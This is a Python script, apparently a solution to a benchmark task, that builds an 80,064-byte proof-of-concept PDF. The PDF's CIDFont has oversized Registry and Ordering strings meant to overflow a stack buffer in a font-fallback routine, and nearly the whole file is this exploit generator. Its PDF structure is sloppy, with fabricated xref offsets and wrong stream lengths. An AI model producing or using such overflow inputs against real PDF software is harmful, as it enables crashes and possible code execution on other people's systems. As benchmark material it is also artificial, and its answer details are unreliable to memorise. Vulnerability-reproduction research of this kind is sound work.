import os
import tempfile
import tarfile
import re
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a simple PDF with a CIDFont that has an excessively long
        # Registry-Ordering string to trigger the buffer overflow
        poc = self.create_overflow_pdf()
        return poc
    
    def create_overflow_pdf(self) -> bytes:
        # Ground truth length is 80064 bytes
        # We'll create a Registry-Ordering string that exceeds buffer limits
        
        # The overflow happens in CIDFont fallback mechanism
        # Registry-Ordering string format: <Registry>-<Ordering>
        # We need to make this string long enough to overflow the stack buffer
        
        # Create a minimal PDF structure with a CIDFont that has a very long
        # Registry-Ordering combination in CIDSystemInfo
        
        # Calculate string lengths to reach exactly 80064 bytes
        total_target = 80064
        
        # Basic PDF structure overhead (estimated)
        pdf_overhead = 500  # Conservative estimate
        
        # Registry and Ordering strings will be mostly 'A's
        # The hyphen between them adds 1 byte
        registry_len = (total_target - pdf_overhead - 1) // 2
        ordering_len = registry_len
        
        registry = b'A' * registry_len
        ordering = b'B' * ordering_len
        
        # Build the PDF
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b'%PDF-1.4\n')
        
        # Create a CIDFont object with long Registry-Ordering
        font_obj = b'''1 0 obj
<<
  /Type /Font
  /Subtype /CIDFontType0
  /BaseFont /ABCDEE+Cambria
  /CIDSystemInfo <<
    /Registry (%s)
    /Ordering (%s)
    /Supplement 0
  >>
  /FontDescriptor 2 0 R
  /DW 1000
  /W [65 1000]
>>
endobj
''' % (registry, ordering)
        
        pdf_parts.append(font_obj)
        
        # Font descriptor object
        pdf_parts.append(b'''2 0 obj
<<
  /Type /FontDescriptor
  /FontName /ABCDEE+Cambria
  /Flags 4
  /FontBBox [0 0 1000 1000]
  /ItalicAngle 0
  /Ascent 1000
  /Descent 0
  /CapHeight 1000
  /StemV 80
  /FontFile 3 0 R
>>
endobj
''')
        
        # Embedded font program (minimal)
        pdf_parts.append(b'''3 0 obj
<<
  /Length 100
>>
stream
%% minimal font data
endstream
endobj
''')
        
        # Page object
        pdf_parts.append(b'''4 0 obj
<<
  /Type /Page
  /Parent 5 0 R
  /MediaBox [0 0 612 792]
  /Contents 6 0 R
  /Resources <<
    /Font <<
      /F1 1 0 R
    >>
  >>
>>
endobj
''')
        
        # Pages object
        pdf_parts.append(b'''5 0 obj
<<
  /Type /Pages
  /Kids [4 0 R]
  /Count 1
>>
endobj
''')
        
        # Content stream
        pdf_parts.append(b'''6 0 obj
<<
  /Length 50
>>
stream
BT /F1 12 Tf 100 700 Td (Test) Tj ET
endstream
endobj
''')
        
        # Catalog
        pdf_parts.append(b'''7 0 obj
<<
  /Type /Catalog
  /Pages 5 0 R
>>
endobj
''')
        
        # Cross-reference table (simplified)
        pdf_parts.append(b'''xref
0 8
0000000000 65535 f 
0000000010 00000 n 
0000000500 00000 n 
0000001000 00000 n 
0000001500 00000 n 
0000002000 00000 n 
0000002500 00000 n 
0000003000 00000 n 
''')
        
        # Trailer
        pdf_parts.append(b'''trailer
<<
  /Size 8
  /Root 7 0 R
>>
startxref
3500
%%EOF''')
        
        # Combine all parts
        pdf_data = b''.join(pdf_parts)
        
        # If PDF is shorter than target, pad with comments
        if len(pdf_data) < total_target:
            padding = b'\n% ' + b'X' * (total_target - len(pdf_data) - 3)
            pdf_data = pdf_data.replace(b'%%EOF', padding + b'%%EOF')
        
        # Truncate if somehow longer (shouldn't happen with our calculation)
        if len(pdf_data) > total_target:
            pdf_data = pdf_data[:total_target]
        
        return pdf_data